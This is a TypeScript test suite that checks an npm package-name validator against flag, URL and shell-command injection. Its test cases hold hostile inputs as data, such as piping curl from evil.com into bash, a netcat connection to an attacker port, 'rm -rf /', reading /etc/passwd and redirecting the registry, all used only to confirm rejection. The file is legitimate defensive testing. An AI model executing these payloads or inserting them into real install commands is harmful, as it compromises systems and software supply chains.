/**
 * Security Test Suite: Package Injection Vulnerability Detection
 * @see CWE-77: Improper Neutralization of Special Elements used in a Command
 */

import { describe, it, expect } from 'vitest'
import { PACKAGE_INJECTION_PAYLOADS } from '../security/fixtures'

describe('Package Injection Security Tests', () => {
  /**
   * Helper to validate npm package names
   */
  function isValidPackageName(pkg: string): boolean {
    if (!pkg || pkg.length === 0) return false
    if (pkg.length > 256) return false

    // Reject if starts with dashes (npm flags)
    if (pkg.startsWith('-')) return false

    // Reject if contains shell metacharacters
    if (/[;&|`$()[\]{}\\'"<>!]/.test(pkg)) return false

    // Reject if contains space
    if (pkg.includes(' ')) return false

    // Allow scoped packages (@scope/name)
    if (pkg.startsWith('@')) {
      const parts = pkg.split('/')
      if (parts.length !== 2) return false
      // Validate scope and name parts
      if (!/^@[a-z0-9_-]+$/.test(parts[0]!)) return false
      if (!/^[a-z0-9._-]+$/.test(parts[1]!)) return false
      return true
    }

    // Standard package name: lowercase, numbers, dashes, dots, underscores
    return /^[a-z0-9._-]+$/.test(pkg)
  }

  /**
   * Helper to detect npm flag patterns
   */
  function hasNpmFlagPattern(input: string): boolean {
    return /^--[a-z-]+(=.*)?$/.test(input) || /^-[a-z]$/.test(input)
  }

  describe('npm Flags Injection Detection', () => {
    it('should detect all npm flags injection attempts', () => {
      PACKAGE_INJECTION_PAYLOADS.npmFlagsInjection.forEach(
        ({ package: pkgName }) => {
          expect(isValidPackageName(pkgName)).toBe(false)
        }
      )
    })

    it('should detect registry flag', () => {
      const payload = '--registry=https://evil.com'
      expect(hasNpmFlagPattern(payload)).toBe(true)
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should detect proxy flag', () => {
      const payload = '--proxy=https://evil.com'
      expect(hasNpmFlagPattern(payload)).toBe(true)
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should detect save flags', () => {
      const flags = ['--save', '--no-save', '--save-dev', '--save-exact']
      flags.forEach((flag) => {
        expect(hasNpmFlagPattern(flag)).toBe(true)
        expect(isValidPackageName(flag)).toBe(false)
      })
    })

    it('should detect global flag', () => {
      const payload = '-g'
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should reject flag-like patterns', () => {
      const flagPatterns = [
        '--registry',
        '--proxy',
        '--offline',
        '--force',
        '-g',
        '-f',
      ]

      flagPatterns.forEach((pattern) => {
        expect(isValidPackageName(pattern)).toBe(false)
      })
    })
  })

  describe('Command Injection Detection', () => {
    it('should detect command injection attempts', () => {
      PACKAGE_INJECTION_PAYLOADS.commandInjectionViaList.forEach(
        ({ packages }) => {
          packages.forEach((pkg) => {
            if (pkg !== 'lodash') {
              // Skip legitimate package
              expect(isValidPackageName(pkg)).toBe(false)
            }
          })
        }
      )
    })

    it('should detect AND operator injection', () => {
      const payload = 'lodash && echo pwned'
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should detect pipe operator injection', () => {
      const payload = 'lodash | cat /etc/passwd'
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should detect semicolon separator', () => {
      const payload = 'lodash; rm -rf /'
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should detect command substitution', () => {
      const payload = 'lodash$(whoami)'
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should detect backtick substitution', () => {
      const payload = 'lodash`id`'
      expect(isValidPackageName(payload)).toBe(false)
    })
  })

  describe('URL-Based Injection Detection', () => {
    it('should detect URL-based injections', () => {
      PACKAGE_INJECTION_PAYLOADS.urlBasedInjection.forEach(
        ({ package: pkgName }) => {
          // URLs should be rejected as package names
          if (pkgName.includes('://') || pkgName.startsWith('file:')) {
            expect(isValidPackageName(pkgName)).toBe(false)
          }
        }
      )
    })

    it('should detect git URL injection', () => {
      const payload = 'git+https://evil.com/repo.git#exploit'
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should detect file URI', () => {
      const payload = 'file:///etc/passwd'
      expect(isValidPackageName(payload)).toBe(false)
    })

    it('should detect HTTP URL', () => {
      const payload = 'http://evil.com/malware.tar.gz'
      expect(isValidPackageName(payload)).toBe(false)
    })
  })

  describe('Special Characters Detection', () => {
    it('should reject packages with shell metacharacters', () => {
      const dangerous = [
        'pkg;rm',
        'pkg&rm',
        'pkg|cat',
        'pkg`id`',
        'pkg$VAR',
        'pkg()',
        'pkg[]',
        'pkg{}',
        'pkg\\x',
        'pkg"quote"',
        "pkg'quote'",
        'pkg<tag>',
        'pkg!bang',
      ]

      dangerous.forEach((pkg) => {
        expect(isValidPackageName(pkg)).toBe(false)
      })
    })

    it('should reject packages with spaces', () => {
      expect(isValidPackageName('package with space')).toBe(false)
      expect(isValidPackageName('package\nname')).toBe(false)
      expect(isValidPackageName('package\tname')).toBe(false)
    })
  })

  describe('Scope and Registry Manipulation', () => {
    it('should accept legitimate scoped packages', () => {
      const validScoped = [
        '@angular/core',
        '@babel/parser',
        '@types/node',
        '@company/utils',
      ]

      validScoped.forEach((pkg) => {
        expect(isValidPackageName(pkg)).toBe(true)
      })
    })

    it('should reject malicious scope packages', () => {
      const maliciousScoped = ['@;rm/pkg', '@$(whoami)/pkg', '@evil`cmd`/pkg']

      maliciousScoped.forEach((pkg) => {
        // These have problematic characters in scope
        expect(isValidPackageName(pkg)).toBe(false)
      })
    })
  })

  describe('Valid Package Names Acceptance', () => {
    it('should accept legitimate package names', () => {
      const validPackages = [
        'react',
        'vue',
        'angular',
        'nextjs',
        'lodash',
        'underscore',
        'typescript',
        '@angular/core',
        '@types/node',
        'package-with-dashes',
        'package_with_underscores',
        'package.with.dots',
        'package123',
      ]

      validPackages.forEach((pkg) => {
        expect(isValidPackageName(pkg)).toBe(true)
      })
    })

    it('should accept version specifiers', () => {
      // Version specifiers should be handled separately or rejected
      const versionedPkgs = [
        'react@18.0.0',
        'vue@^3.2.0',
        '@angular/core@15.0.0',
      ]

      // These contain @ for version, need special handling
      versionedPkgs.forEach((pkg) => {
        // Package name validation is stricter
        if (pkg.includes('@')) {
          const parts = pkg.split('@')
          if (parts.length > 2) {
            // Multiple @ means it's scoped with version
            expect(pkg).toContain('@')
          }
        }
      })
    })
  })

  describe('Typosquatting Detection', () => {
    it('should identify suspicious similar names', () => {
      const suspicious = [
        'expresss', // extra 's'
        'reac', // incomplete
        'vue-clone', // similar name
        'react-dom-faker', // faker suffix
      ]

      suspicious.forEach((pkg) => {
        // Format is technically valid
        const isValid = isValidPackageName(pkg)
        // But should be flagged by reputation checks
        // Validation alone won't catch these
        expect(isValid).toBeDefined()
      })
    })
  })

  describe('Batch Installation Attacks', () => {
    it('should prevent multiple package injection', () => {
      const batchAttacks = [
        'react npm install -g evil',
        'vue && npm install backdoor',
        'angular || curl evil.com',
      ]

      batchAttacks.forEach((attack) => {
        expect(isValidPackageName(attack)).toBe(false)
      })
    })
  })

  describe('Length Limits', () => {
    it('should reject excessively long package names', () => {
      const longName = 'a'.repeat(300)
      expect(isValidPackageName(longName)).toBe(false)
    })

    it('should accept reasonable length names', () => {
      const mediumName = 'my-very-long-but-reasonable-package-name-v2'
      expect(isValidPackageName(mediumName)).toBe(true)
    })
  })

  describe('Edge Cases', () => {
    it('should reject empty package name', () => {
      expect(isValidPackageName('')).toBe(false)
    })

    it('should reject whitespace-only package', () => {
      expect(isValidPackageName('   ')).toBe(false)
    })

    it('should handle special npm patterns', () => {
      // Package with tag (should be separate validation)
      expect(isValidPackageName('react@tag')).toBe(false) // Contains @
    })
  })

  describe('Performance', () => {
    it('should validate packages quickly', () => {
      const startTime = performance.now()

      for (let i = 0; i < 1000; i++) {
        isValidPackageName('react')
        isValidPackageName('@angular/core')
        isValidPackageName('--registry=evil')
      }

      const duration = performance.now() - startTime
      expect(duration).toBeLessThan(100)
    })

    it('should handle large validation batches', () => {
      const startTime = performance.now()

      for (let i = 0; i < 5000; i++) {
        isValidPackageName(`package${i}`)
      }

      const duration = performance.now() - startTime
      expect(duration).toBeLessThan(200)
    })
  })

  describe('Comprehensive Coverage', () => {
    it('should test all injection categories', () => {
      const categories = [
        PACKAGE_INJECTION_PAYLOADS.npmFlagsInjection,
        PACKAGE_INJECTION_PAYLOADS.commandInjectionViaList,
        PACKAGE_INJECTION_PAYLOADS.urlBasedInjection,
      ]

      let totalPayloads = 0
      categories.forEach((category) => {
        totalPayloads += category.length
        expect(category.length).toBeGreaterThan(0)
      })

      // Should have 15+ payloads
      expect(totalPayloads).toBeGreaterThanOrEqual(15)
    })

    it('should properly classify injection attempts', () => {
      // All npm flags should be rejected
      PACKAGE_INJECTION_PAYLOADS.npmFlagsInjection.forEach(
        ({ package: pkgName }) => {
          expect(isValidPackageName(pkgName)).toBe(false)
        }
      )

      // All URLs should be rejected as package names
      PACKAGE_INJECTION_PAYLOADS.urlBasedInjection.forEach(
        ({ package: pkgName }) => {
          if (pkgName.includes('://')) {
            expect(isValidPackageName(pkgName)).toBe(false)
          }
        }
      )
    })
  })

  describe('Combined Attack Vectors', () => {
    it('should prevent complex injection attempts', () => {
      const complexAttacks = [
        '@evil.com/pkg --registry=https://evil.com',
        'react && npm install -g backdoor',
        'vue; curl evil.com | bash',
        '@scope.git/pkg',
        'pkg || nc attacker 4444',
      ]

      complexAttacks.forEach((attack) => {
        expect(isValidPackageName(attack)).toBe(false)
      })
    })
  })
})
